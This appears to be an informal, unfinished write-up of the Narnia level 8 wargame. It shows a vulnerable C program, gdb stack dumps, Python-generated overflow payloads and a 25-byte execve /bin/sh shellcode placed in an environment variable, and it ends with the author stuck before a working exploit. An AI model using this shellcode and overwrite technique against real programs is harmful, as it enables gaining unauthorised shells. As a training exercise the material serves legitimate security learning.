# **we're clooose to the end!!!**

what are we going to do????? MMMMMM
let's read the code first!!

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}

```

By reading we quickly get the main point of that app, it prints out the arg we give, but apparently we cant overflow it?! (no strcpy :((( )
I tried with the max until bash told me to stop!

How am i suppose to break into if "I can't buffer overflow"???
but the program, even if he handle as much parameter as we want, the "writting" process don't tell us the same, after 21char, the program goes totally crazy and print 12 random char (however the size)

Let's understand what's happening at the deep level, let's launch gdb!



## El famoso gdb part!
Alright so let's put our assmebly flavor to intel so it's more readable, alright let's disas func now!!
There are a loooot of things(we're not using a strcpy so there are a lot of different calls)
Which one of them are really interesting??

By observing all those datas I notified one interesent fact, let's analyze this (at this point I was really touching & hoping that I'll touch stg interesent because even OWASP brought me a solution that convince me , my search were too large lol)

So I run my gdb, have a break on the last nop of disas func (+114) and let's have a large look up with a x/200wx $esp
Alright so here are all the my data, I can see my \x41 and my \x42 (i runned it with 20 A)

```bash 
(gdb) x/16wx $esp
0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141		I seems to have a return address
0xffffd694:     0x41414141     -0xffffd889-     0xffffd6a8      0x080484a7		just after so thats cool here
0xffffd6a4:    -0xffffd889-     0x00000000      0xf7e2a286      0x00000002
```

alright but what about if I put more than 20? So i add 25 A this time

```bash
(gdb) x/16wx $esp
0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141		But now my return address
0xffffd694:     0x41414141     -0xffffd841-     0xffffd6a8      0x080484a7		have changed and i dont like that
0xffffd6a4:    -0xffffd884-     0x00000000      0xf7e2a286      0x00000002
```

OKKkkkk so apparently my return address seems to switch if I had more than excepted, soooo, is there a key or something to get my hex back to the normal addresses?
So i added the "original" address at the end bu i notice that, every time i add the last part of it, like \x89, the key after changes to, in my case \xd8 became \x43
And i noticed a thing, there is like a "copy" of this address 2 bytes after who'se supposed to be the same
And when it's right he is the same, and here I'm wrong. when i just add \x89 those two aren't the same,
I came to the conclusion that maybe i should copy the last one to override the first one!

```bash
(gdb)run $(python -c 'print "A"*20 + "\x89"')
(gdb) x/16wx $esp
0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd694:     0x41414141      0xffff4389      0xffffd6a8      0x080484a7
0xffffd6a4:    -0xffffd887-     0x00000000      0xf7e2a286      0x00000002
```

So here i will add this (0xffffd887) to my new command

```bash
(gdb) run $(python -c 'print "A"*20 + "\x87\xd8"')
(gdb) x/16wx $esp
0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd694:     0x41414141      0xffffd887      0xffffd6a8      0x080484a7
0xffffd6a4:    -0xffffd886-     0x00000000      0xf7e2a286      0x00000002
```

Okkk so apparently it changes again so let's change to 86

```bash
(gdb) run $(python -c 'print "A"*20 + "\x86\xd8"')
(gdb) x/16wx $esp
0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd694:     0x41414141     -0xffffd886-     0xffffd6a8      0x080484a7
0xffffd6a4:    -0xffffd886-     0x00000000      0xf7e2a286      0x00000002
```

And when i added one \xff i noticed that the new address reduced by one again, so here is a pattern!!
Let's be quicker a retire one each time you add something after!!

```bash
(gdb) run $(python -c 'print "A"*20 + "\x84\xd8\xff\xff"')
(gdb) x/16wx $esp
0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd694:     0x41414141     -0xffffd884-     0xffffd6a8      0x080484a7
0xffffd6a4:    -0xffffd884-     0x00000000      0xf7e2a286      0x00000002
```

So now i should be able to add what ever i want after this, if so I do have a buffer overflow!!!
I want to add 4 B so let's soustract 4 to my 84 and add BBBB at the end!

```bash
(gdb) run $(python -c 'print "A"*20 + "\x80\xd8\xff\xff" + "BBBB"')
(gdb) x/16wx $esp
0xffffd684:     0x41414141      0x41414141      0x41414141      0x41414141		My BBBB are here so I have a buffer 
0xffffd694:     0x41414141      0xffffd880     -0x42424242-     0x080484a7		overflow!!! time to inject a
0xffffd6a4:     0xffffd880      0x00000000      0xf7e2a286      0x00000002		shellcode !!
```

But i do have a HUGE PROBLEM HERE, i'm limited to 20 char and my shcode is 25 char long....
It's time to use the big brain memory!! 
Remermber Narnia2?? with the EGG env var??
what if i create a env var and just mentione it to get my shcode!!

`export SHCODE=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')`

And then we can search his hex address and use it instead of our BBBB who's pretty useless
To find his addresses let's make a little C program

```c
  1 #include <stdio.h>                                                   
  2                                                                      
  3 int main(int argc,char* argv[])                                      
  4 {                                                                    
  5     printf("You shcode var is at Hex Addr:  %p \n", getenv("SHCODE"));             
  6 }
```

Some really basic basic stuff, so let's compile it with `gcc env.c -o env`
Now we can execute it and get: 0xffffefd0

PERFECT WE'RE CLOSE TO THE END

Let's just replace our original run func with this env var!!

```bash
/narnia/narnia8 $(python -c 'print "A"*20 + "\x80\xd8\xff\xff" + "\xd0\xef\xff\xff"')
```

But we do have a last problem !!  the return address isn't the same in gdb and in real, so let's get the hex of the real one by printing 20 char and throwing them into xxd

```bash
/narnia/narnia8 $(python -c 'print "A"*20') |xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 7dd8 ffff a8d6 ffff a784 0408  AAAA}...........		We do want the 7dd8 ffff part but in
00000020: 7dd8 ffff 0a                             }....				big endian and minus 8!!

```

Take you favorite hex calculator and get the result of 0xffffd87d - 8 = 0xffffd875 !!! 

ALRIGHT LAST STEP !!!
replace your "gdb" address by this one and we should be done!!

```bash
/narnia/narnia8 $(python -c 'print "A"*20 + "\x75\xd8\xff\xff" + "\xd0\xef\xff\xff"')
```

Not gonna lie, i'm blocked here, you can't imaagine how frustrating it is, so i'll just wait a bit and come back to it later !

>My thoughts are macaroni and my brain is Spaghetti
											-Rom1


